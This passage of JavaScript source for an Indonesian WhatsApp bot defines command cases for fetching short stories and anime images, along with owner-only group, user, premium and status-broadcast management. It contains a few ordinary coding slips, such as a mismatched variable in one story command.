❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-ramadhan': {
                let hasil = await cerpen(`ramadhan`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-remaja': {
                let hasil = await cerpen(`remaja`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-rindu': {
                let hasil = await cerpen(`rindu`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-rohani': {
                let cerpe = await cerpen(`rohani`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-romantis': {
                let hasil = await cerpen(`romantis`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-sastra': {
                let hasil = await cerpen(`sastra`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-sedih': {
                let hasil = await cerpen(`sedih`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'cerpen-sejarah': {
                let hasil = await cerpen(`sejarah`, {
                    quoted: fkontak1
                })
                m.reply(`
❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}\n
❏ *Story*: ${hasil.cerita}`, {
                    quoted: fkontak1
                })
            }
            break
            case 'animeawoo':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animemegumin':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeshinobu':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehandhold':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehighfive':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecringe':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animedance':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehappy':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeglomp':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmug':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeblush':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewave':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animesmile':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepoke':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewink':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebonk':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebully':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeyeet':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animebite':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animelick':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekill':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecry':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewlp':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animekiss':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animehug':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break

case 'couplepp': case 'ppcouple': {
Replyx(mess.wait)
let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
let random = anucpp[Math.floor(Math.random() * anucpp.length)]
Xlesy.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
Xlesy.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break

case 'animeneko':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animepat':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeslap':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animecuddle':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animewaifu':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animenom':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefoxgirl':{
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/foxgirl`)       
            await Xlesy.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.done}, { quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animetickle': {
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`)     
            await Xlesy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.done},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animegecg': {
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`)     
            await Xlesy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.done},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'dogwoof': {
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`)     
            await Xlesy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.done},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case '8ballpool': {
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`)     
            await Xlesy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.done},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'goosebird': {
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`)     
            await Xlesy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.done},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animefeed': {
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`)     
            await Xlesy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.done},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'animeavatar': {
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await Xlesy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.done},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'lizardpic': {
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await Xlesy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.done},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'catmeow': {
Replyx(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await Xlesy.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.done},{ quoted:m }).catch(err => {
return('Error!')
})
}
break

            case 'animecari': {
                await Xlesy.sendMessage(m.chat, {
                    react: {
                        text: '🔍',
                        key: m.key
                    }
                })
                // Example .animecari Naruto 
                searchAnime(Xlesy, m, text)
            }
            break


            // Owner Menu
            case 'restartbot': 
case 'restart': {
    if (!isCreator) return Reply("sorry you are not the bot owner!")
    m.reply(`♻️ _*Restarting bot..*_ Wait 1 Minutes After Successd`)
    m.reply(mess.done)

    setTimeout(() => {
        m.reply(mess.done) // Mengirim pesan setelah restart
        process.exit() // Menutup proses bot
    }, 2000)                
}
break
            case "creatgc": {
                if (!isOwner) return m.reply(msg.owner) // Hanya owner yang bisa pakai

                if (!text) return Replyx("Gunakan format: *.creatgc Nama Grup*", {
                    quoted: fkontak1
                })

                let groupName = text.trim() // Ambil nama grup dari teks input

                try {
                    let group = await Xlesy.groupCreate(groupName, [m.sender]) // Buat grup dengan owner sebagai anggota
                    let groupId = group.id

                    await Xlesy.sendMessage(groupId, {
                        text: `Grup *${groupName}* berhasil dibuat! ✅`
                    })
                    m.reply(`Grup *${groupName}* berhasil dibuat!`, {
                        quoted: fkontak1
                    })

                } catch (e) {
                    Replyx("Gagal membuat grup! Pastikan bot tidak dibatasi.", {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'setbio': {
                if (!isCreator) return Replyx(mess.owner)
                if (!text) return Replyx('Mana text nya?')
                Xlesy.setStatus(q)
                m.reply(`*Bio telah di ganti menjadi ${q}*`, {
                    quoted: fkontak1
                })
            }
            break
           case 'setppbot': {
				if (!isCreator) return Replyx(mess.owner)
				if (!/image/.test(quoted.type)) return Replyx(`Reply Image Dengan Caption ${prefix + command}`)
				Replyx(mess.load)
				let media = await Xlesy.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
				if (text.length > 0) {
					let { img } = await generateProfilePicture(media)
					await Xlesy.query({
						tag: 'iq',
						attrs: {
							to: '@s.whatsapp.net',
							type: 'set',
							xmlns: 'w:profile:picture'
						},
						content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]
					})
					await fs.unlinkSync(media)
					Replyx(mess.done)
				} else {
					await Xlesy.updateProfilePicture(botNumber, { url: media })
					await fs.unlinkSync(media)
					Replyx(mess.done)
				}
			}
			break
            case 'delppbot': {
                if (!isCreator) return Replyx(mess.owner)
                await Xlesy.removeProfilePicture(Xlesy.user.id)
                Replyx('Sukses')
            }
            break
            case 'join': {
                if (!isCreator) return Replyx(mess.owner)
                if (!text) return Replyx('Masukkan Link Group!', {
                    quoted: fkontak1
                })
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return Replyx('Link Invalid!', {
                    quoted: fkontak1
                })

                const result = args[0].split('https://chat.whatsapp.com/')[1]
                Replyx(mess.wait)

                try {
                    const response = await Xlesy.groupAcceptInvite(result)
                    if (response) {
                        Replyx('Bot berhasil join ke grup!', {
                            quoted: fkontak1
                        })

                        // Mengirim pesan ke grup setelah join
                        let groupMetadata = await Xlesy.groupMetadata(response)
                        let groupId = groupMetadata.id
                        let welcomeMessage = `_Halo semua! Saya adalah bot yang Siap Membantu Group Ini!.. Owner Saya ${owner}_`

                        await Xlesy.sendMessage(groupId, {
                            text: welcomeMessage
                        }, {
                            quoted: fkontak1
                        })
                    }
                } catch (res) {
                    if (res.data == 400) return Replyx('Grup Tidak Ditemukan❗', {
                        quoted: fkontak1
                    })
                    if (res.data == 401) return Replyx('Bot Di Kick Dari Grup Tersebut❗', {
                        quoted: fkontak1
                    })
                    if (res.data == 409) return Replyx('Bot Sudah Join Di Grup Tersebut❗', {
                        quoted: fkontak1
                    })
                    if (res.data == 410) return Replyx('URL Grup Telah Di Setel Ulang❗', {
                        quoted: fkontak1
                    })
                    if (res.data == 500) return Replyx('Grup Penuh❗', {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'leaveid':
                if (!isOwner) return Replyx("❌ *Hanya Owner yang bisa menggunakan perintah ini!*");
                if (!args[0]) return Replyx("⚠️ *Masukkan ID grup yang ingin ditinggalkan!*");

                let groupId = args[0];

                try {
                    await Xlesy.groupLeave(groupId);
                    await Xlesy.sendMessage(m.sender, {
                        text: `✅ Berhasil keluar dari grup: ${groupId}`
                    }, {
                        quoted: fkontak1
                    })
                } catch (err) {
                    await Xlesy.sendMessage(m.sender, {
                        text: `❌ Gagal keluar dari grup!\n\nError: ${err}`
                    }, {
                        quoted: fkontak1
                    })
                }
                break
            case 'leave': {
                if (!isCreator) return Replyx(mess.owner)
                await Xlesy.groupLeave(m.chat).then(() => Xlesy.sendFromOwner(owner, 'Sukses Keluar Dari Grup', m, {
                    contextInfo: {
                        isForwarded: true
                    }
                }))
            }
            break
            case 'clearchat': {
                if (!isCreator) return Replyx(mess.owner)
                await Xlesy.chatModify({
                    delete: true,
                    lastMessages: [{
                        key: m.key,
                        messageTimestamp: m.timestamp
                    }]
                }, m.chat)
                Replyx('Sukses Membersihkan Pesan', {
                    quoted: fkontak1
                })
            }
            break
            case 'blokir':
            case 'block': {
                if (!isCreator) return Replyx(mess.owner)
                if (!text && !m.quoted) {
                    m.reply(`Contoh: ${prefix + command} 62xxx`, {
                        quoted: fkontak1
                    })
                } else {
                    const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
                    await Xlesy.updateBlockStatus(numbersOnly, 'block').then((a) => m.reply(mess.done)).catch((err) => Replyx('Gagal!'))
                }
            }
            break
            case 'listblock': {
                let anu = await Xlesy.fetchBlocklist()
                m.reply(`Total Block : ${anu.length}\n` + anu.map(v => '• ' + v.replace(/@.+/, '')).join`\n`, {
                    quoted: fkontak1
                })
            }
            break
            case 'openblokir':
            case 'unblokir':
            case 'openblock':
            case 'unblock': {
                if (!isCreator) return Replyx(mess.owner)
                if (!text && !m.quoted) {
                    m.reply(`Contoh: ${prefix + command} 62xxx`, {
                        quoted: fkontak1
                    })
                } else {
                    const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
                    await Xlesy.updateBlockStatus(numbersOnly, 'unblock').then((a) => m.reply(mess.done)).catch((err) => Replyx('Gagal!'))
                }
            }
            break
            case 'adduang': {
                if (!isCreator) return Replyx(mess.owner)
                if (!args[0] || !args[1] || isNaN(args[1])) return m.reply(`Kirim/tag Nomernya!\nExample:\n${prefix + command} 62xxx 1000`, {
                    quoted: fkontak1
                })
                const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                const onWa = await Xlesy.onWhatsApp(nmrnya)
                if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!')
                if (db.users[nmrnya] && db.users[nmrnya].uang >= 0) {
                    addUang(args[1], nmrnya, db)
                    Replyx('Sukses Add Uang')
                } else {
                    Replyx('User tidak terdaftar di database!')
                }
            }
            break
            case 'addlimit': {
                if (!isCreator) return Replyx(mess.owner)
                if (!args[0] || !args[1] || isNaN(args[1])) return m.reply(`Kirim/tag Nomernya!\nExample:\n${prefix + command} 62xxx 10`, {
                    quoted: fkontak1
                })
                const nmrnya = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                const onWa = await Xlesy.onWhatsApp(nmrnya)
                if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!', {
                    quoted: fkontak1
                })
                if (db.users[nmrnya] && db.users[nmrnya].limit >= 0) {
                    addLimit(args[1], nmrnya, db)
                    Replyx('Sukses Add limit', {
                        quoted: fkontak1
                    })
                } else {
                    Replyx('User tidak terdaftar di database!', {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'listpc': {
                if (!isCreator) return Replyx(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                let teks = `● *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                if (anu.length === 0) return m.reply(teks)
                for (let i of anu) {
                    if (store.messages[i] && store.messages[i].array && store.messages[i].array[0]) {
                        let nama = store.messages[i].array[0].pushName
                        teks += `${setv} *Nama :* ${nama}\n${setv} *User :* @${i.split('@')[0]}\n${setv} *Chat :* https://wa.me/${i.split('@')[0]}\n\n=====================\n\n`
                    }
                }
                await m.reply(teks, {
                    quoted: fkontak1
                })
            }
            break
            case 'listgc': {
                if (!isCreator) return Replyx(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                let teks = `● *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                if (anu.length === 0) return m.reply(teks)

                for (let i of anu) {
                    let metadata;
                    try {
                        metadata = store.groupMetadata[i]
                    } catch (e) {
                        metadata = (store.groupMetadata[i] = await Xlesy.groupMetadata(i).catch(() => ({})))
                    }

                    if (metadata?.subject) {
                        teks += `${setv} *Nama :* ${metadata.subject}\n`
                        teks += `${setv} *Admin :* ${metadata.owner ? `@${metadata.owner.split('@')[0]}` : '-' }\n`
                        teks += `${setv} *ID :* ${metadata.id}\n`
                        teks += `${setv} *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
                        teks += `${setv} *Member :* ${metadata.participants.length}\n`
                        teks += `\n=====================\n\n`
                    }
                }

                await m.reply(teks, {
                    quoted: fkontak1
                })
            }
            break
            case 'creategc':
            case 'buatgc': {
                if (!isCreator) return Replyx(mess.owner)
                if (!text) return Replyx(`Example:\n${prefix + command} *Nama Gc*`, {
                    quoted: fkontak1
                })
                let group = await Xlesy.groupCreate(q, [m.sender])
                let res = await Xlesy.groupInviteCode(group.id)
                await m.reply(`*Link Group :* *https://chat.whatsapp.com/${res}*\n\n*Nama Group :* *${q}*`, {
                    detectLink: true
                })
                await Xlesy.groupParticipantsUpdate(group.id, [m.sender], 'promote')
                await Xlesy.sendMessage(group.id, {
                    text: 'Done'
                })
            }
            break
            case 'addpr':
            case 'addprem':
            case 'addpremium': {
                if (!isCreator) return Replyx(mess.owner)
                if (!text) return Replyx(`Example:\n${prefix + command} @tag|waktu\n${prefix + command} @${m.sender.split('@')[0]}|30 hari`, {
                    quoted: fkontak1
                })
                let [teks1, teks2] = text.split`|`
                const nmrnya = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                const onWa = await Xlesy.onWhatsApp(nmrnya)
                if (!onWa.length > 0) return Replyx('Nomer Tersebut Tidak Terdaftar Di Whatsapp!', {
                    quoted: fkontak1
                })
                if (teks2) {
                    if (db.users[nmrnya] && db.users[nmrnya].limit >= 0) {
                        prem.addPremiumUser(nmrnya, teks2.replace(/[^0-9]/g, '') + 'd', premium);
                        m.reply(`Sukses ${command} @${nmrnya.split('@')[0]} Selama ${teks2}`, {
                            quoted: fkontak1
                        })
                        db.users[nmrnya].limit += db.users[nmrnya].vip ? limit.vip : limit.premium
                        db.users[nmrnya].uang += db.users[nmrnya].vip ? uang.vip : uang.premium
                    } else Replyx('Nomer tidak terdaftar di BOT !', {
                        quoted: fkontak1
                    })
                } else {
                    m.reply(`Masukkan waktunya!\Example:\n${prefix + command} @tag|waktu\n${prefix + command} @${m.sender.split('@')[0]}|30d\n_d = day_`, {
                        quoted: fkontak1
                    })
                }
            }
            break
            case 'delpr':
            case 'delprem':
            case 'delpremium': {
                if (!isCreator) return Replyx(mess.owner)
                if (!text) return Replyx(`Example:\n${prefix + command} @tag`, {
                    quoted: fkontak1
                })
                const nmrnya = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (db.users[nmrnya] && db.users[nmrnya].limit >= 0) {
                    if (prem.checkPremiumUser(nmrnya, premium)) {
                        premium.splice(prem.getPremiumPosition(nmrnya, premium), 1);
                        fs.writeFileSync('./database/premium.json', JSON.stringify(premium));
                        m.reply(`Sukses ${command} @${nmrnya.split('@')[0]}`, {
                            quoted: fkontak1
                        })
                        db.users[nmrnya].limit += db.users[nmrnya].vip ? limit.vip : limit.free
                        db.users[nmrnya].uang += db.users[nmrnya].vip ? uang.vip : uang.free
                    } else {
                        m.reply(`User @${nmrnya.split('@')[0]} Bukan Premium❗`, {
                            quoted: fkontak1
                        })
                    }
                } else Replyx('Nomer tidak terdaftar di BOT !', {
                    wuoted: fkontak1
                })
            }
            break
            case 'listpr':
            case 'listprem':
            case 'listpremium': {
                if (!isCreator) return Replyx(mess.owner)

                let txt = `*------「 LIST PREMIUM 」------*\n\n`

                if (premium.length === 0) {
                    return Replyx("Tidak ada pengguna premium saat ini.", {
                        quoted: fkontak1
                    })
                }

                for (let userprem of premium) {
                    let userData = db.users[userprem.id] // Ambil data user

                    if (!userData) { // Cek apakah user terdaftar di db.users
                        txt += `➸ *Nomer*: @${userprem.id.split('@')[0]}\n➸ *Limit*: Data tidak ditemukan\n➸ *Uang*: Data tidak ditemukan\n➸ *Expired*: ${formatDate(userprem.expired)}\n\n`
                    } else {
                        txt += `➸ *Nomer*: @${userprem.id.split('@')[0]}\n➸ *Limit*: ${userData.limit || 0}\n➸ *Uang*: ${userData.uang ? userData.uang.toLocaleString('id-ID') : 0}\n➸ *Expired*: ${formatDate(userprem.expired)}\n\n`
                    }
                }

                m.reply(txt, {
                    quoted: fkontak1
                })
            }
            break
            case 'upsw': {
                if (!isCreator) return Replyx(mess.owner)
                const statusJidList = Object.keys(db.users)
                const backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16).padStart(6, '0');
                try {
                    if (quoted.isMedia) {
                        if (/image|video/.test(quoted.mime)) {
                            await Xlesy.sendMessage('status@broadcast', {
                                [`${quoted.mime.split('/')[0]}`]: await quoted.download(),
                                caption: text || m.quoted?.body || ''
                            }, {
                                statusJidList,
                                broadcast: true
                            })
                            Xlesy.sendMessage(m.chat, {
                                react: {
                                    text: '✅',
                                    key: m.key
                                }
                            })
                        } else if (/audio/.test(quoted.mime)) {
                            await Xlesy.sendMessage('status@broadcast', {
                                audio: await quoted.download(),
                                mimetype: 'audio/mp4',
                                ptt: true
                            }, {
                                backgroundColor,
                                statusJidList,
                                broadcast: true
                            })
                            Xlesy.sendMessage(m.chat, {
                                react: {
                                    text: '✅',
                                    key: m.key
                                }
                            })
                        } else Replyx('Only Support video/audio/image/text')
                    } else if (quoted.text) {
                        await Xlesy.sendMessage('status@broadcast', {
                            text: text || m.quoted?.body || ''
                        }, {
                            textArgb: 0xffffffff,
                            font: Math.floor(Math.random() * 9),
                            backgroundColor,
                            statusJidList,
                            broadcast: true
                        })
                        Xlesy.sendMessage(m.chat, {
                            react: {
                                text: '✅',
                                key: m.key
                            }
                        })
                    } else Replyx('Only Support video/audio/image/text')
                } catch (e) {
                    Replyx('Gagal Mengupload Status Whatsapp!')
                }
            }
            break
          case 'addcase': {
    if (!isCreator) return Replyx(mess.owner)
    if (!text || !text.startsWith('case')) return Replyx('Masukkan Casenya dengan benar! (harus mulai dengan case)')

    fs.readFile('Xlesy.js', 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return Replyx('Gagal membaca file!');
        }
        const posisi = data.lastIndexOf('break') + 5; // cari posisi setelah break terakhir
        if (posisi !== -1) {
            const codeBaru = data.slice(0, posisi) + '\n\n' + text + '\n' + data.slice(posisi);
            fs.writeFile('Xlesy.js', codeBaru, 'utf8', (err) => {
                if (err) {
                    console.error('Terjadi kesalahan saat menulis file:', err);
                    return Replyx('Gagal menulis file!');
                }
                Replyx('✅ Case berhasil ditambahkan!');
            });
        } else {
            Replyx('❌ Gagal menemukan posisi "break" dalam file!');
        }
    });
}
break;
            case 'getcase': {
                if (!isCreator) return Replyx(mess.owner)
                if (!text) return Replyx('Masukkan Nama Casenya!')
                try {
                    const getCase = (cases) => {
                        return "case" + `'${cases}'` + fs.readFileSync("Xlesy.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break"
                    }
                    m.reply(`${getCase(text)}`, {
                        quoted: fkontak1
                    })
